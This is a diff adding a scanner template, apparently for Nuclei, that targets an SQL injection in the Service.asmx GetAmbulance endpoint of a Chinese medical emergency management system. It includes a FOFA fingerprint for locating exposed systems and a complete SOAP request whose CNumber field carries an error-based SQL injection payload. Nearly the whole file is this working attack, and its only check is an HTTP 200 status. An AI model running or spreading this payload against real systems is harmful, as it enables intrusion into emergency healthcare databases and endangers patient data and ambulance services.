@@ -1,0 +1,19 @@
+id: poc-dddv2szpxf92gd1n
+info:
+  name: 珠海市安克电子技术有限公司医疗急救管理系统Service.asmx存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dddv2szpxf92gd1n'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dddv2szpxf92gd1n
+    fofa: fid="v6Cd4x0Px/YZrVqV3jQ3xQ=="
+http:
+- raw:
+  - "POST /api/Service.asmx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Encoding: gzip, deflate, br\nContent-Type: text/xml\nCookie: ASP.NET_SessionId=exrktu3aplxg004tcc2ntnuw; FailCount=5; ASPSESSIONIDSSDTSCDA=OLGBFHMCDJBLGKGENPLEECCO\nSOAPAction: [http://tempuri.org/GetAmbulance](http://tempuri.org/GetAmbulance)\nX-Requested-With: XMLHttpRequest\nConnection: close\nContent-Length: 494\n\n<?xml version=\"1.0\"?>\n<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tns=\"http://tempuri.org/\">\n    <soap:Header />\n    <soap:Body>\n        <tns:GetAmbulance>\n            <tns:CNumber>11' AND 6537 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(118)+CHAR(113)+(SELECT (CASE WHEN (6537=6537) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(113)))-- ntgj</tns:CNumber>\n        </tns:GetAmbulance>\n    </soap:Body>\n</soap:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
